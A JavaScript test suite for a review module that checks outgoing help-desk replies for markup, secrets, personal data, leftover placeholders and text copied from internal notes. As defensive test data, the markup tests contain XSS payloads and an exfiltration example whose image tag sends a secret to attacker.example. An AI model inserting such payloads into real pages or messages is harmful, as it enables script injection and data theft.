import test from 'node:test';
import assert from 'node:assert/strict';
import { internalTextsOf, isCustomerVisible, markupFindings, overlapFindings, placeholderFindings, reviewForCustomer, reviewForInsert } from '../src/safeSend/review.js';
import { seriousFindings } from '../src/compose/sendCheck.js';
import { checkOutgoing } from '../src/safeSend/index.js';

const people = [{ role: 'caller', name: 'Abel Tuter', email: 'abel.tuter@example.com' }];
const kinds = (list) => list.map((f) => f.kind);

// ---- Markup (AB-SEC-01) ---------------------------------------------------------------------------------------------------

test('a tag, [code] or a script link is a serious finding, anywhere text is inserted', () => {
  for (const text of ['<img src=x onerror=1>', 'see </p> here', '[code]<img src=x>[/code]', 'x [/code] y', '[CODE]hi', 'click javascript:alert(1)', 'click JavaScript :alert(1)', 'vbscript:run', '<!-- hidden -->', '<?xml version="1.0"?>', '<svg/onload=1>']) {
    assert.deepEqual(kinds(markupFindings(text)).includes('MARKUP'), true, text);
    for (const field of ['comments', 'work_notes', 'close_notes', 'text', 'short_description', 'description', 'body', 'cause_notes']) {
      const review = reviewForInsert(field, text, { people });
      assert.ok(review.serious.some((f) => f.kind === 'MARKUP'), `${field}: ${text}`);
    }
  }
});

test('a draft with [code]<img..>[/code] is flagged, with a short excerpt and advice and never the whole payload', () => {
  const draft = 'Please try again.\n[code]<img src="https://attacker.example/p.gif?d=hostname-secret-12345">[/code]';
  const review = reviewForCustomer(draft, { people });
  const markup = review.serious.filter((f) => f.kind === 'MARKUP');
  assert.ok(markup.length >= 2, kinds(review.serious).join());
  assert.equal(markup[0].severity, 'high');
  for (const f of markup) {
    assert.ok(f.excerpt.length <= 24, f.excerpt);
    assert.ok(!f.excerpt.includes('hostname-secret'));
    assert.match(f.advice, /markup/i);
  }
});

test('ordinary text is not markup: comparisons, arrows, "I <3 you", numbers and a lone bracket', () => {
  for (const text of ['x < 5 and y > 3', 'a -> b', 'I <3 this', '5<6', 'Use [PERSON] as a label', 'array[0] = 1', 'Mail me at a@b.example', 'JavaScript is a language', 'java script: no']) {
    assert.deepEqual(markupFindings(text), [], text);
  }
});

test('at most three markup findings are reported, in order', () => {
  const found = markupFindings('<a> <b> <c> <d> <e> [code] javascript:x');
  assert.equal(found.length, 3);
  assert.ok(found.every((f, i, all) => i === 0 || all[i - 1].start <= f.start));
});

// ---- One implementation (AB-SEC-08, L11) -----------------------------------------------------------------------------------

test('low-severity findings are returned as hints, not dropped, and the serious ones still block', () => {
  const text = 'Please ask your colleague John Smith about 10.1.2.3 and it was escalated to Tier 2. Your password: Summer2024!x';
  const review = reviewForCustomer(text, { people });
  assert.ok(review.serious.some((f) => f.kind === 'SECRET'), 'the password blocks');
  const hintKinds = kinds(review.hints);
  assert.ok(hintKinds.includes('OTHER_PERSON'), hintKinds.join());
  assert.ok(hintKinds.includes('IP'));
  assert.ok(review.hints.some((f) => f.kind === 'INTERNAL_PHRASE' && /escalated to/i.test(f.excerpt)));
  assert.ok(review.hints.every((f) => f.severity === 'low'));
  assert.ok(review.serious.every((f) => f.severity !== 'low'));
  // nothing is both, nothing is lost
  const direct = checkOutgoing(text, { people }).findings.length;
  assert.ok(review.serious.length + review.hints.length >= direct);
});

test('the names and values in findings are masked excerpts, never the value', () => {
  const review = reviewForCustomer('Mail someone.else@example.com, your card is 4111 1111 1111 1111, ask your colleague John Smith.', { people });
  const all = JSON.stringify([...review.serious, ...review.hints]);
  assert.ok(!all.includes('someone.else@example.com'));
  assert.ok(!all.includes('4111 1111 1111 1111'));
  assert.ok(!all.includes('John Smith'));
});

test('the Write section\'s seriousFindings is the same review (no second copy)', () => {
  const text = 'Hi Abel, your password: Summer2024!x and card 4111 1111 1111 1111 [code]x[/code] [PERSON_1]';
  assert.deepEqual(seriousFindings(text, people), reviewForCustomer(text, { people }).serious);
  assert.deepEqual(seriousFindings('fine', people), []);
  const scan = (t) => (t.includes('bare-secret-value') ? [{ kind: 'SECRET', start: t.indexOf('bare-secret-value'), end: t.indexOf('bare-secret-value') + 17, value: 'bare-secret-value' }] : []);
  assert.deepEqual(seriousFindings('your sign-in is bare-secret-value now', people, scan), reviewForCustomer('your sign-in is bare-secret-value now', { people, scan }).serious);
});

test('what the firewall hid and the model brought back is caught through scan(); a throwing scan changes nothing', () => {
  const text = 'Your sign-in value is Winter2026bare now';
  const scan = () => [{ kind: 'SECRET', start: 21, end: 34, value: 'Winter2026bare' }];
  const review = reviewForCustomer(text, { people, scan });
  assert.ok(review.serious.some((f) => f.kind === 'SECRET' && /hidden from the AI/.test(f.advice)));
  assert.ok(!JSON.stringify(review).includes('Winter2026bare'));
  assert.deepEqual(reviewForCustomer('fine', { people, scan: () => { throw new Error('boom'); } }), { serious: [], hints: [] });
  assert.deepEqual(reviewForCustomer('fine', { people, scan: 'not a function' }), { serious: [], hints: [] });
});

test('which fields count as customer-visible comes from FILLABLE_FIELDS, and unknown fields are checked', () => {
  for (const f of ['comments', 'close_notes', 'text', 'short_description', 'description', 'body']) assert.equal(isCustomerVisible(f), true, f);
  for (const f of ['work_notes', 'cause_notes', 'workaround']) assert.equal(isCustomerVisible(f), false, f);
  assert.equal(isCustomerVisible('something_else'), true);
  // The customer-visible fields ResultView used to skip (title and problem statement) are checked now.
  for (const f of ['short_description', 'description']) {
    assert.ok(reviewForInsert(f, 'Call abel.other@example.org', { people }).serious.some((x) => x.kind === 'EMAIL'), f);
  }
  // An internal field is not held up by personal data...
  assert.deepEqual(reviewForInsert('work_notes', 'Call abel.other@example.org on 555-123-4567', { people }), { serious: [], hints: [] });
});

// ---- Placeholders (L8) -----------------------------------------------------------------------------------------------------

test('a placeholder that was never replaced is flagged', () => {
  const found = placeholderFindings('Dear [PERSON_1], your [EMAIL_2] is set. [TICKET_LINK] stays.');
  assert.deepEqual(found.map((f) => f.excerpt), ['[PERSON_1]', '[EMAIL_2]'], 'only the NAME_n shape the firewall writes');
  assert.ok(found.every((f) => f.severity === 'medium' && f.kind === 'PLACEHOLDER'));
  assert.ok(reviewForCustomer('Dear [PERSON_1],', { people }).serious.some((f) => f.kind === 'PLACEHOLDER'));
  // in an internal field it is a hint, not a stop
  const internal = reviewForInsert('work_notes', 'Called [PERSON_1] back', { people });
  assert.deepEqual(internal.serious, []);
  assert.deepEqual(kinds(internal.hints), ['PLACEHOLDER']);
  assert.deepEqual(placeholderFindings('no markers [x] [A_B] [a_1] here'), []);
});

// ---- Words copied from an internal note (AB-SEC-07) -----------------------------------------------------------------------------

const NOTE = 'Root cause: the finance share for the Q3 restructuring lives on the payroll folder, do not mention to the requester.';

test('six words in a row that are also in a work note are flagged; five are not', () => {
  const six = 'We checked the finance share for the Q3 restructuring and it works.';
  const found = overlapFindings(six, [NOTE]);
  assert.equal(found.length, 1);
  assert.equal(found[0].kind, 'INTERNAL_NOTE');
  assert.equal(found[0].severity, 'medium');
  assert.equal(six.slice(found[0].start, found[0].end), 'the finance share for the Q3 restructuring');
  assert.match(found[0].advice, /internal work note/);
  assert.ok(!found[0].excerpt.includes('finance'), 'masked');
  assert.deepEqual(overlapFindings('We checked the finance share for the weekend only.', [NOTE]), [], 'five words in a row, then a different one');
});

test('case and punctuation do not hide a copied passage; separate runs are separate findings; a long run is one finding', () => {
  assert.equal(overlapFindings('THE FINANCE SHARE, for the Q3 restructuring!', [NOTE]).length, 1);
  const long = overlapFindings('Hi. The finance share for the Q3 restructuring lives on the payroll folder. Bye.', [NOTE]);
  assert.equal(long.length, 1);
  assert.equal('Hi. The finance share for the Q3 restructuring lives on the payroll folder. Bye.'.slice(long[0].start, long[0].end), 'The finance share for the Q3 restructuring lives on the payroll folder');
  const two = overlapFindings('the finance share for the Q3 restructuring. Something else entirely. lives on the payroll folder, do not mention', [NOTE]);
  assert.equal(two.length, 2);
});

test('it reaches the customer-visible review, and not the internal fields', () => {
  const draft = 'Thanks. The finance share for the Q3 restructuring is fixed.';
  const review = reviewForCustomer(draft, { people, internalTexts: [NOTE] });
  assert.ok(review.serious.some((f) => f.kind === 'INTERNAL_NOTE'));
  assert.deepEqual(reviewForCustomer(draft, { people }).serious.filter((f) => f.kind === 'INTERNAL_NOTE'), []);
  assert.deepEqual(reviewForInsert('work_notes', draft, { people, internalTexts: [NOTE] }), { serious: [], hints: [] }, 'copying a work note into a work note is fine');
});

test('nothing to compare with, odd input, and very long text stay quiet and fast', () => {
  for (const notes of [undefined, null, [], [''], ['   '], [42], 'text']) assert.deepEqual(overlapFindings('some words that are not in any note at all', notes), []);
  assert.deepEqual(overlapFindings('', [NOTE]), []);
  assert.deepEqual(overlapFindings(null, [NOTE]), []);
  const big = 'word '.repeat(12000);
  const started = Date.now();
  overlapFindings(big, [big.slice(0, 20000)]);
  assert.ok(Date.now() - started < 1500);
  // short words that add up to less than 24 characters are not a passage
  assert.deepEqual(overlapFindings('a b c d e f', ['a b c d e f g']), []);
});

test('the work notes of a pack are the journal entries of type work_note, newest last', () => {
  const pack = { journal: [
    { type: 'comment', text: 'public' },
    { type: 'work_note', text: 'internal one' },
    { type: 'work_note', text: '   ' },
    { type: 'work_note', text: 'internal two' },
    null,
    { type: 'work_note' },
  ] };
  assert.deepEqual(internalTextsOf(pack), ['internal one', 'internal two']);
  assert.deepEqual(internalTextsOf({}), []);
  assert.deepEqual(internalTextsOf(null), []);
});
